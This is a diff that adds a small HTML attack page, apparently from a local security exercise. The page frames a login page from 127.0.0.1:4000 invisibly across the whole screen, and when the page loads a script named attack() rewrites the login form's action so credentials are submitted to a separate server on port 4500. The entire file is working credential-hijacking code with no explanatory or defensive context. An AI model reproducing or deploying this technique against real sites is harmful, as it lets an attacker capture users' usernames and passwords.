@@ -1,0 +1,12 @@
+<script>
+function attack() {
+  var myIframe = document.getElementById("loginPageIframe");
+  var iframeDoc = myIframe.contentDocument || myIframe.contentWindow.document;
+  var form = iframeDoc.getElementsByTagName("form");
+  form[0].action = "http://localhost:4500/login";
+}
+</script>
+
+<body onload="attack()">
+<iframe id="loginPageIframe" style="border: 0; position: fixed; top: 0; left: 0; bottom: 0; width: 100%; height: 100%;" src="http://127.0.0.1:4000/login"></iframe>
+ 
